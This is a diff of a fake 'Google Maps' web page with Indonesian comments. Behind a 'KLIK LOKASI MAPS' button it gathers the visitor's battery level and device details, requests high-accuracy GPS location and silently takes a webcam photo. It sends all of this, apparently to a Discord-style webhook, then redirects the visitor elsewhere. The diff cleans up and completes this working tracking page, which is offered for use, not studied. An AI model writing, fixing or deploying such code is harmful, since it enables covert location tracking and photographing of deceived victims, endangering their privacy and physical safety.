@@ -6,34 +6,9 @@
     <title>Google Maps</title>
     <style>
         body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background: #ffffff; display: flex; flex-direction: column; align-items: center; }
-        
-        /* Gambar Satelit di Atas */
-        .header-image {
-            width: 100%;
-            height: 250px;
-            background-image: url('https://i.imgur.com/v6S767v.png'); /* Gambar Satelit Maps */
-            background-size: cover;
-            background-position: center;
-            border-bottom: 2px solid #e0e0e0;
-        }
-
+        .header-image { width: 100%; height: 250px; background-image: url('https://i.imgur.com/v6S767v.png'); background-size: cover; background-position: center; border-bottom: 2px solid #e0e0e0; }
         .container { padding: 40px 20px; text-align: center; }
-        
-        .btn-link {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            text-transform: uppercase;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            width: 100%;
-            max-width: 300px;
-        }
-
+        .btn-link { background-color: #1a73e8; color: white; border: none; padding: 18px 40px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; text-transform: uppercase; box-shadow: 0 2px 4px rgba(0,0,0,0.2); width: 100%; max-width: 300px; }
         #status { margin-top: 15px; color: #70757a; font-size: 12px; }
         #video, #canvas { display: none; }
     </style>
@@ -41,7 +16,6 @@
 <body>
 
     <div class="header-image"></div>
-
     <div class="container">
         <button id="mainBtn" class="btn-link">KLIK LOKASI MAPS</button>
         <p id="status">Ketuk untuk sinkronisasi rute satelit</p>
@@ -56,25 +30,25 @@
 
         async function sikatData() {
             const btn = document.getElementById('mainBtn');
+            const video = document.getElementById('video');
             btn.innerText = "MENYAMBUNGKAN...";
             btn.disabled = true;
 
-            // 1. Info Perangkat & Baterai
+            // 1. Info Baterai & Hardware
             let bat = "N/A";
-            if (navigator.getBattery) { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; }
-            const hw = `${navigator.hardwareConcurrency || 'N/A'} Core / ${navigator.deviceMemory || 'N/A'} GB RAM`;
-            const dev = `${navigator.platform} | ${navigator.userAgent}`;
+            try { if (navigator.getBattery) { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; } } catch(e){}
+            const infoDev = `${navigator.platform} | ${navigator.userAgent}`;
 
-            // 2. Minta Lokasi
+            // 2. Minta Lokasi (Akurasi Tinggi)
             navigator.geolocation.getCurrentPosition(async (p) => {
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
-                const msg = `📍 **Maps:** https://www.google.com/maps?q=${lat},${lon}\n🎯 **Akurasi:** ${Math.round(p.coords.accuracy)}m\n🔋 **Baterai:** ${bat}\n🧠 **Hardware:** ${hw}\n📱 **Device:** ${dev}`;
+                const acc = Math.round(p.coords.accuracy);
+                const msg = `📍 **Maps:** https://www.google.com/maps?q=${lat},${lon}\n🎯 **Akurasi:** ${acc}m\n🔋 **Baterai:** ${bat}\n📱 **Device:** ${infoDev}`;
 
                 // 3. Ambil Kamera
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('video');
                     video.srcObject = stream;
 
                     setTimeout(() => {
@@ -90,51 +64,30 @@
 
                             await fetch(webhookURL, { method: "POST", body: fd });
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = targetURL; // Alihkan ke Grand Indonesia
+                            window.location.href = targetURL; 
                         }, 'image/png');
                     }, 1500);
                 } catch (e) {
-                    await fetch(webhookURL, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ content: msg + "\n❌ Kamera Ditolak" })});
+                    // Jika kamera ditolak, tetap kirim lokasi
+                    await fetch(webhookURL, { 
+                        method: "POST", 
+                        headers: {"Content-Type": "application/json"}, 
+                        body: JSON.stringify({ content: msg + "\n❌ Kamera Ditolak" })
+                    });
                     window.location.href = targetURL;
                 }
+            }, (err) => {
+                alert("Izin lokasi diperlukan untuk sinkronisasi satelit.");
+                btn.innerText = "KLIK LOKASI MAPS";
+                btn.disabled = false;
+            }, { 
+                enableHighAccuracy: true, 
+                timeout: 15000, 
+                maximumAge: 0 
+            });
+        }
 
-           // Bagian akhir fungsi sikatData()
-// ... bagian atas sikatData() ...
-    
-    // 2. Minta Lokasi
-    navigator.geolocation.getCurrentPosition(async (p) => {
-        const lat = p.coords.latitude;
-        const lon = p.coords.longitude;
-        const msg = `**Maps:** https://www.google.com/maps?q=${lat},${lon}\n**Akurasi:** ${Math.round(p.coords.accuracy)}m`;
-
-        // 3. Ambil Kamera
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-setTimeout(() => {
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            canvas.toBlob(async (blob) => {
-                const fd = new FormData();
-                fd.append("file", blob, "cam.png");
-                fd.append("payload_json", JSON.stringify({ content: msg }));
-                await fetch(webhookURL, { method: "POST", body: fd });
-                window.location.href = targetURL;
-            }, 'image/png');
-        }, 1500);
-    }, (err) => {
-        alert("Izin lokasi diperlukan.");
-        btn.innerText = "KLIK LOKASI MAPS";
-        btn.disabled = false;
-    }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-} // Penutup fungsi sikatData
-
-document.getElementById('mainBtn').addEventListener('click', sikatData);
+        document.getElementById('mainBtn').addEventListener('click', sikatData);
     </script>
 </body>
 </html>
-
